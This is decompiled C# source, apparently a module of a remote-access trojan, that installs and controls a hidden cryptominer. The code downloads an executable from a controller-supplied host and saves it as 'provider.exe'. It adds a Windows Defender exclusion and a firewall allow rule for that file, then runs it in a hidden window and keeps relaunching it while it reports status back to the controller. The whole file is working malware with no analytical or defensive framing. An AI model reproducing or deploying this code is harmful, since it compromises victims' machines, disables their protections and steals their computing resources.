using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Threading;
using Leb128;

namespace Plugin.Helper;

internal class MinerControler
{
	public static string args = null;

	public static CancellationTokenSource ctsMiner;

	public static bool Installing = false;

	public static bool Working = false;

	public static string gpu = string.Join(",", Methods.GetHardwareInfo("Win32_VideoController", "Name")).ToLower();

	public static string userprofile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	public static string host1;

	public static void Install(string host)
	{
		host1 = host;
		if (File.Exists(Path.Combine(userprofile, "provider.exe")))
		{
			return;
		}
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Client.Disconnect();
			return;
		}
		if (host.Contains("https"))
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
		}
		WebClient webClient = new WebClient();
		File.WriteAllBytes(Path.Combine(userprofile, "provider.exe"), webClient.DownloadData(host + "/rigel.exe"));
		WindowsDefenderExclusion.Exc(Path.Combine(userprofile, "provider.exe"));
		netSh(Path.Combine(userprofile, "provider.exe"), "provider");
	}

	public static void netSh(string path, string name)
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "CMD";
			processStartInfo.Arguments = "netsh advfirewall firewall add rule name=\"" + name + "\" dir=in action=allow program=\"" + path + "\" enable=yes & exit";
			processStartInfo.Verb = "runas";
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
	}

	public static void ShellVerb(string command)
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "cmd";
			processStartInfo.Arguments = "/c " + command;
			processStartInfo.Verb = "runas";
			processStartInfo.Arguments += " && exit";
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
	}

	public static void Start()
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		ctsMiner = new CancellationTokenSource();
		args = args.Replace("%hwid%", Plugin.hwid);
		while (!ctsMiner.IsCancellationRequested && Client.itsConnect)
		{
			try
			{
				bool flag = true;
				ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(string.Format("select CommandLine from Win32_Process where Name='{0}'", "provider.exe")).Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						if (((string)((ManagementBaseObject)(ManagementObject)enumerator.Current)["CommandLine"]).Contains("-u"))
						{
							flag = false;
							Client.Send(LEB128.Write(new object[3] { "MinerRigel", "Status", "active default" }));
							break;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (flag && !ctsMiner.IsCancellationRequested)
				{
					if (!AntiProcess.antiprocess && AntiProcess.Enabled)
					{
						Client.Send(LEB128.Write(new object[3] { "MinerRigel", "Status", "anti process" }));
					}
					else
					{
						Client.Send(LEB128.Write(new object[3] { "MinerRigel", "Status", "dont mining" }));
					}
					if (!AntiProcess.antiprocess)
					{
						ShellVerb(Path.Combine(userprofile, "provider.exe") + " " + args);
						Working = true;
					}
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(1000);
		}
		Stop();
	}

	public static void Kill()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		if (!Working)
		{
			return;
		}
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", "provider.exe")).Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				try
				{
					if (((string)((ManagementBaseObject)val)["CommandLine"]).Contains("-u"))
					{
						Process.GetProcessById(Convert.ToInt32(((ManagementBaseObject)val)["ProcessId"])).Kill();
						Working = false;
					}
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void Stop()
	{
		if (ctsMiner != null)
		{
			ctsMiner.Cancel();
			Kill();
			Client.Send(LEB128.Write(new object[3] { "MinerRigel", "Status", "stoped" }));
		}
	}
}
